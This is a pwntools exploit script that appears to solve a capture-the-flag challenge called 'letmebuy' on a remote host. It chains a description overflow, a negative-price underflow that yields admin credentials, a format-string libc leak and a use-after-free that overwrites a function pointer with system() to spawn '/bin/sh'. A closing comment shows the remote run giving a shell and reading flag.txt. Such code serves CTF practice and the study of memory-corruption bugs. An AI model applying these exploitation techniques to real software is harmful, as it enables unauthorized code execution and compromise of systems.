from pwn import *

context.log_level = 'critical'

class client:
	def __init__(self, ip, port, debug):
		self.ip = ip
		self.port = port
		self.debug = debug
		if self.debug:
			self.io = process('./src/letmebuy', env={
				"ADMIN_PASSWORD": "ABC123!"
			})
		else:
			self.io = remote(self.ip, self.port)

	def shell(self):
		self.io.interactive()

	def gdb(self):
		gdb.attach(self.io)

	def register(self, username, password, description):
		self.io.sendlineafter(b'Enter your choice:', b'2')
		self.io.sendlineafter(b'Enter your choice:', b'1')
		self.io.sendlineafter(b'Enter a username:', username)
		self.io.sendlineafter(b'Enter a password:', password)
		self.io.sendlineafter(b'Enter a description:', description)
		self.io.recvline()
		return b'created successfully' in self.io.recvline()

	def login(self, username, password):
		self.io.sendlineafter(b'Enter your choice:', b'1')
		self.io.sendlineafter(b'Enter your username:', username)
		self.io.sendlineafter(b'Enter your password:', password)
		self.io.recvline()
		return b'Login successfully' in self.io.recvline()

	def logout(self):
		self.io.sendlineafter(b'Enter your choice:', b'5')
		self.io.recvline()
		return b'disconnected successfully' in self.io.recvline()

	def sell(self, name, data, price):
		self.io.sendlineafter(b'Enter your choice:', b'3')
		self.io.sendlineafter(b'Enter item name:', name)
		self.io.sendlineafter(b'Enter item data:', data)
		self.io.sendlineafter(b'Enter item price:', price)
		self.io.recvline()
		return b'successfully' in self.io.recvline()

	def buy(self, itemid):
		self.io.sendlineafter(b'Enter your choice:', b'4')
		self.io.sendlineafter(b'you want to buy:', itemid)
		self.io.recvline()
		self.io.recvuntil(b'content: ')
		return self.io.recvline().strip()

	def add_note(self, title, content):
		self.io.sendlineafter(b'Enter your choice:', b'1')
		self.io.sendlineafter(b'Enter title:', title)
		self.io.sendlineafter(b'Enter note content:', content)
		self.io.recvline()
		return self.io.recvline()

	def delete_note(self, index, free=True):
		self.io.sendlineafter(b'Enter your choice:', b'2')
		self.io.sendlineafter(b'to delete:', index)
		self.io.sendlineafter(b'(y/n)', b'y' if free else b'n')
		self.io.recvline()

	def view_notes(self):
		self.io.sendlineafter(b'Enter your choice:', b'3')
		self.io.recvline()
		self.io.recvline()
		r = self.io.recvuntil(b'###')[:-3].strip()
		return r

	def edit_notes(self, index, title, data):
		self.io.sendlineafter(b'Enter your choice:', b'7')
		self.io.sendlineafter(b'Enter note index to edit:', index)		
		self.io.sendlineafter(b'Enter new note title:', title)
		self.io.sendlineafter(b'Enter new note content:', data)
		return self.io.recvline()

	def add_message(self, title, content):
		self.io.sendlineafter(b'Enter your choice:', b'4')
		self.io.sendlineafter(b'Enter message title:', title)
		self.io.sendlineafter(b'Enter message content:', content)
		self.io.recvline()

	def delete_message(self, index, free=True):
		self.io.sendlineafter(b'Enter your choice:', b'5')
		self.io.sendlineafter(b'to delete:', index)
		self.io.recvline()

	def send_messages(self):
		self.io.sendlineafter(b'Enter your choice:', b'6')


c = client('13.38.208.179', 14796, debug=(not args.REMOTE))

# Register Seller
print(f"Register seller account using overflow")
c.register(username=b'seller1', password=b'seller1', description=b'A'*20 + b'\x01') # Overflow to register seller
c.login(username=b'seller1', password=b'seller1')

print("Sell item usint negative price")
c.sell(name=b'GiveMeMoney', data=b"abcd", price=b"-9999999") # Price underflow
c.logout()

# Register Buyer
print(f"Register buyer account")
c.register(username=b'buyer1', password=b'buyer1', description=b'A') 
c.login(username=b'buyer1', password=b'buyer1')
c.buy(itemid=b'2')  										# Buy negative price item

# Buy admin creds
admin_pwd = c.buy(itemid=b'1')
c.logout()

print("Login as admin")
c.login(username=b'owner', password=admin_pwd)

# Leak libc base using fstring
if args.REMOTE:
	libc= ELF('./src/libc.so.6')
else:
	libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')


# Full leak
# for _ in range(1, 50):
# 	leak = c.add_note(title=(f'%{_}$p').encode(), content=b'A')
# 	print(f'{_} | {leak}')
# 	c.delete_note(b'1', free=True)

leak = c.add_note(title=(f'%13$p').encode(), content=b'A')
leak = int(leak.split(b'Note created:')[1].strip(), 16)

print(f"Leak at {hex(leak)}")

if args.REMOTE:
	offset = 0x24083
else:
	offset = 0x2718a

libc.address = leak - offset

print(f"Libc at {hex(libc.address)}")

# UAF on note 
print('Triggering Use-After-Free on note object')
c.add_note(title=b'note1', content=b'A')
c.delete_note(b'1', free=False)

# malloc new message
c.add_message(title=b'message1', content=b'B')

# Edit note -> message
payload = b'A'*(64 - 20)			 # Fill Message.title
payload+= b'B'*200					 # Fill Message.message
payload+= p64(libc.symbols['system'])# Fill Message.send_func

print('Poisoning data & title to call system(/bin/sh)')
c.edit_notes(b'1',
	title=b'/bin/sh\x00',
	data=payload
)

# c.gdb()

# Trigger message.send_func(message.title)
c.send_messages()

# Shell
c.shell()

"""
$ python3 solve.py REMOTE
Register seller account using overflow
Sell item usint negative price
Register buyer account
Login as admin
Leak at 0x7f7b65c88083
Libc at 0x7f7b65c64000
Triggering Use-After-Free on note object
Poisoning data & title to call system(/bin/sh)

$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt  letmebuy  letmebuy.c    libc.so.6
$ cat flag.txt
flag{ThisIsAFakeFlag}
"""